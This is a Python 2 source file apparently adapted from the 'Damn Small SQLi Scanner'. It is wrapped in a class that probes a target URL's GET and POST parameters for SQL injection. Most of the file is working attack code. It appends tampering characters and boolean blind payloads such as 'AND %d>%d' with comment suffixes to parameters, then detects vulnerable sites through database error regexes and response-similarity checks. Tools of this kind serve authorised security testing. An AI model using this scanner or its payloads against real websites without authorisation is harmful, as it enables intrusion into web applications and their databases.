#!/usr/bin/env python
import difflib, httplib, itertools, optparse, random, re, urllib, urllib2, urlparse
import colprint

class SqlInject():


    NAME    = "Damn Small SQLi Scanner (DSSS) < 100 LoC (Lines of Code)"
    VERSION = "0.2m"
    AUTHOR  = "Miroslav Stampar (@stamparm)"
    LICENSE = "Public domain (FREE)"
    
    PREFIXES = (" ", ") ", "' ", "') ", "\"", "%%' ", "%%') ")              # prefix values used for building testing blind payloads
    SUFFIXES = ("", "-- -", "#", "%%00", "%%16")                            # suffix values used for building testing blind payloads
    TAMPER_SQL_CHAR_POOL = ('(', ')', '\'', '"')                            # characters used for SQL tampering/poisoning of parameter values
    BOOLEAN_TESTS = ("AND %d>%d", "OR NOT (%d>%d)")                         # boolean tests used for building testing blind payloads
    COOKIE, UA, REFERER = "Cookie", "User-Agent", "Referer"                 # optional HTTP header names
    GET, POST = "GET", "POST"                                               # enumerator-like values used for marking current phase
    TEXT, HTTPCODE, TITLE, HTML = xrange(4)                                 # enumerator-like values used for marking content type
    FUZZY_THRESHOLD = 0.95                                                  # ratio value in range (0,1) used for distinguishing True from False responses
    TIMEOUT = 20                                                            # connection timeout in seconds
    
    DBMS_ERRORS = {
        "MySQL": (r"SQL syntax.*MySQL", r"Warning.*mysql_.*", r"valid MySQL result", r"MySqlClient\."),
        "PostgreSQL": (r"PostgreSQL.*ERROR", r"Warning.*\Wpg_.*", r"valid PostgreSQL result", r"Npgsql\."),
        "Microsoft SQL Server": (r"Driver.* SQL[\-\_\ ]*Server", r"OLE DB.* SQL Server", r"(\W|\A)SQL Server.*Driver", r"Warning.*mssql_.*", r"(\W|\A)SQL Server.*[0-9a-fA-F]{8}", r"(?s)Exception.*\WSystem\.Data\.SqlClient\.", r"(?s)Exception.*\WRoadhouse\.Cms\."),
        "Microsoft Access": (r"Microsoft Access Driver", r"JET Database Engine", r"Access Database Engine"),
        "Oracle": (r"ORA-[0-9][0-9][0-9][0-9]", r"Oracle error", r"Oracle.*Driver", r"Warning.*\Woci_.*", r"Warning.*\Wora_.*")
    }
    
    _headers = {}                                                           # used for storing dictionary with optional header values
    
    def _retrieve_content(self,url, data=None):
        retval = {self.HTTPCODE: httplib.OK}
        
        tmp = ''
        for i in xrange(len(url)):
            if i > url.find('?'):
                tmp += url[i].replace(' ','%20')
            else:
                tmp += url[i]
        try:
            req = urllib2.Request(tmp, data)
            retval[self.HTML] = urllib2.urlopen(req, timeout=self.TIMEOUT).read()
            

        except Exception, ex:
            retval[self.HTTPCODE] = getattr(ex, "code", None)
            print retval[self.HTTPCODE]
            retval[self.HTML] = ex.read() if hasattr(ex, "read") else getattr(ex, "msg", "")
            
        match = re.search(r"<title>(?P<result>[^<]+)</title>", retval[self.HTML], re.I)
        retval[self.TITLE] = match.group("result") if match and "result" in match.groupdict() else None
        retval[self.TEXT] = re.sub(r"(?si)<script.+?</script>|<!--.+?-->|<style.+?</style>|<[^>]+>|\s+", " ", retval[self.HTML])
        
        return retval

    
    
    def ScanSql(self,url, data=None):
        is_vul, usable = False, False
        url, data = re.sub(r"=(&|\Z)", "=1\g<1>", url) if url else url, re.sub(r"=(&|\Z)", "=1\g<1>", data) if data else data
        try:
            for phase in (self.GET, self.POST):
                original, current = None, url if phase is self.GET else (data or "")
                for match in re.finditer(r"((\A|[?&])(?P<parameter>\w+)=)(?P<value>[^&]+)", current):
                    vulnerable, usable = False, True
                    print "* scanning %s parameter '%s'" % (phase, match.group("parameter"))
                    tampered = current.replace(match.group(0), "%s%s" % (match.group(0), urllib.quote("".join(random.sample(self.TAMPER_SQL_CHAR_POOL, len(self.TAMPER_SQL_CHAR_POOL))))))
                    content = self._retrieve_content(tampered, data) if phase is self.GET else self._retrieve_content(url, tampered)
                    for (dbms, regex) in ((dbms, regex) for dbms in self.DBMS_ERRORS for regex in self.DBMS_ERRORS[dbms]):
                        if not vulnerable and re.search(regex, content[self.HTML], re.I):
                            colprint.strprint(4, " (i) %s parameter '%s' could be error SQLi vulnerable (%s)" % (phase, match.group("parameter"), dbms))
                            is_vul = vulnerable = True
                    vulnerable = False
                    original = original or (self._retrieve_content(current, data) if phase is self.GET else self._retrieve_content(url, current))
                    randint = random.randint(1, 255)
                    for prefix, boolean, suffix in itertools.product(self.PREFIXES, self.BOOLEAN_TESTS, self.SUFFIXES):
                        if not vulnerable:
                            template = "%s%s%s" % (prefix, boolean, suffix)
                            payloads = dict((_, current.replace(match.group(0), "%s%s" % (match.group(0), urllib.quote(template % (randint + 1 if _ else randint, randint), safe='%')))) for _ in (True, False))
                            contents = dict((_, self._retrieve_content(payloads[_], data) if phase is self.GET else self._retrieve_content(url, payloads[_])) for _ in (False, True))
                            if all(_[self.HTTPCODE] for _ in (original, contents[True], contents[False])) and (any(original[_] == contents[True][_] != contents[False][_] for _ in (self.HTTPCODE, self.TITLE))):
                                vulnerable = True
                            else:
                                ratios = dict((_, difflib.SequenceMatcher(None, original[self.TEXT], contents[_][self.TEXT]).quick_ratio()) for _ in (True, False))
                                vulnerable = all(ratios.values()) and ratios[True] > self.FUZZY_THRESHOLD and ratios[False] < self.FUZZY_THRESHOLD
                            if vulnerable:
                                colprint.strprint(4," (i) %s parameter '%s' appears to be blind SQLi vulnerable" % (phase, match.group("parameter")))
                                is_vul = True
            if not usable:
                colprint.strprint(2, " (x) no usable GET/POST parameters found")
        except KeyboardInterrupt:
            print "\r (x) Ctrl-C pressed"
        return is_vul
    
    
    
